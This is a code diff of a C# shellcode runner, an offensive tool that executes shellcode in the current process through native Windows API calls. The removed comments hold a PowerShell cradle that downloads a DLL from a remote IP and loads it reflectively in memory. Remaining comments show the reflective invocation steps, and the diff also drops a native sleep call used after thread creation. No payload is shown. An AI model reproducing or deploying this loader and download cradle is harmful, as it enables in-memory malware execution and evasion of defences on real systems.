@@ -4,14 +4,7 @@
 // $class = $assem.GetType("ShellcodeRunner.Program")
 // $method = $class.GetMethod("Run")
 // $method.Invoke(0, $null)
-//
-// Reflective loading with:
-// $data = (New-Object System.Net.WebClient).DownloadData('http://10.100.102.30/run.dll')
-// $assem = [System.Reflection.Assembly]::Load($data)
-// $class = $assem.GetType("ShellcodeRunner.Program")
-// $method = $class.GetMethod("Run")
-// $method.Invoke(0, $null)
-//
+
 using System;
 using System.Runtime.InteropServices;
 
@@ -44,9 +37,6 @@ namespace ShellcodeRunner
             uint stackReserveSize,
             IntPtr attributeList
         );
-
-        [DllImport("ntdll.dll", SetLastError = true)]
-        static extern uint NtDelayExecution(bool Alertable, ref long DelayInterval);
 
         // We directly use -1 to represent the current process and thread
         const int CurrentProcess = -1;
@@ -109,10 +99,6 @@ namespace ShellcodeRunner
             }
 
             Console.WriteLine($"Thread created with handle: {hThread}");
-
-            // Sleep to allow the thread to process the APC (alternative to WaitForSingleObject)
-            long delayInterval = 10000000; // Set delay for execution in 100ns units
-            NtDelayExecution(false, ref delayInterval);
         }
     }
 }
